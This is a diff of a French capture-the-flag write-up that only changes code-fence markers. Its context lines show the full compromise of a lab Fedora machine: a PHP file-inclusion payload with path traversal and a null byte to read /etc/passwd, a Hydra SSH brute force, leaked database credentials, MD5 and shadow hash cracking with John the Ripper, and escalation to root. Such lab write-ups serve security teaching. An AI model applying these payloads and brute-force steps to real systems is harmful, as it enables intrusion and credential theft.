@@ -17,7 +17,7 @@ Le système utilisé pour ce CTF est une *Fedora* en version 8.
 Collecte d'information
 ----------------------
 
-```plain
+```
 Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-14 14:01 CEST
 Nmap scan report for 192.168.1.69
 Host is up (0.00035s latency).
@@ -106,13 +106,13 @@ Attaque
 
 La faille est d'une banalité navrante : si on demande ?page=yop on obtient des erreurs PHP bien trop bavardes.  
 
-```plain
+```
 Warning: include_once(inc/yop.php) [function.include-once]: failed to open stream: No such file or directory in /var/www/html/index.php on line 6
 ```
 
 L'inclusion est donc relative et ajoute une extension. Il est alors possible de remonter l'arborescence et de placer un null byte pour casser l'ajout de l'extension. Ainsi avec *?page=../../../../../../../../etc/passwd%00* on obtient :  
 
-```plain
+```
 root:x:0:0:root:/root:/bin/bash
 bin:x:1:1:bin:/bin:/sbin/nologin
 daemon:x:2:2:daemon:/sbin:/sbin/nologin
@@ -183,7 +183,7 @@ Evidemment à vous de remplir préalablement le fichier *logs.txt* avec des path
 
 J'obtiens l'output suivant :  
 
-```plain
+```
 Contenu trouve avec /var/log/lastlog
 Contenu trouve avec /var/log/wtmp
 Contenu trouve avec /var/run/utmp
@@ -217,7 +217,7 @@ Une recherche rapide sur Internet et je trouve une vulnérabilité concernant *N
 
 Ainsi à l'adresse */~andy/data/pagesdata.txt* j'obtiens (il s'agit d'un extrait) :  
 
-```plain
+```
 s:5:"admin";s:8:"password";s:32:"9d2f75377ac0ab991d40c91fd27e52fd";
 ```
 
@@ -233,7 +233,7 @@ Mais cet accès ne semble pas apporter plus d'informations...
 
 J'ai préféré lancer une attaque brute-force sur les comptes SSH en utilisant une liste des 500 pires mots de passe.  
 
-```plain
+```
 $ ./hydra -L users.txt -P top500.txt -e nsr ssh://192.168.1.69
 Hydra v8.0 (c) 2014 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -253,7 +253,7 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2014-07-14 14:56:21
 
 Hydra a trouvé le password *dolphins* pour l'utilisatrice *amy*.  
 
-```plain
+```
 $ ssh amy@192.168.1.69
 amy@192.168.1.69's password: 
 [amy@localhost ~]$ history
@@ -286,7 +286,7 @@ $db_url = 'mysql://root:mysqlpassword@localhost/drupal';
 
 Une fois connecté à MySQL on trouve une base contacts :  
 
-```plain
+```
 mysql> select * from contact;
 +----+--------------------+--------------------------------+--------------+--------------------+
 | id | name               | email                          | phone        | org                |
@@ -302,7 +302,7 @@ mysql> select * from contact;
 
 Ainsi que la base *Drupal* sur laquelle se cache d'autres identifiants à casser :  
 
-```plain
+```
 mysql> select uid,name,pass from users;
 +-----+----------+----------------------------------+
 | uid | name     | pass                             |
@@ -318,7 +318,7 @@ mysql> select uid,name,pass from users;
 
 Il s'agit de hashs MD5, j'en ai cassé deux via JtR :  
 
-```plain
+```
 $ /opt/jtr/john --wordlist=mega_dict.txt --format=raw-md5 hash.txt 
 Loaded 5 password hashes with no different salts (Raw MD5 [128/128 AVX intrinsics 12x])
 password         (patrick)
@@ -328,7 +328,7 @@ guesses: 2  time: 0:00:00:02 DONE (Mon Jul 14 15:17:54 2014)  c/s: 33511K
 
 Et le reste via le site [hashkiller.co.uk](http://www.hashkiller.co.uk/) :  
 
-```plain
+```
 andy:newdrupalpass
 loren:lorenpass
 ```
@@ -340,7 +340,7 @@ Escalade de privilèges
 
 Dans */var/spool/mail/* on trouve un email pour *amy* :
 
-```plain
+```
 From apache@localhost.localdomain  Wed Apr 29 13:00:34 2009
 Return-Path: <apache@localhost.localdomain>
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
@@ -410,7 +410,7 @@ Root password
 
 F\*\*tus beatniks :D Il n'y a plus qu'à passer root via su :  
 
-```plain
+```
 [amy@localhost ~]$ su 
 Mot de passe : 
 [root@localhost amy]# id
@@ -421,7 +421,7 @@ root:$1$7ailm4aT$4HlsZaiGztAsgj4JXL92Y.:14362:0:99999:7:::
 
 Les hashs présents dans /etc/shadow se cassent facilement avec la wordlist de *RockYou* (visiblement l'auteur du CTF aime bien cette liste et utilise les mots de passe trouvés dedans pour ses autres CTFs) :  
 
-```plain
+```
 Loaded 5 password hashes with 5 different salts (FreeBSD MD5 [128/128 AVX intrinsics 12x])
 50$cent          (cyrus)
 buckyboy         (loren)
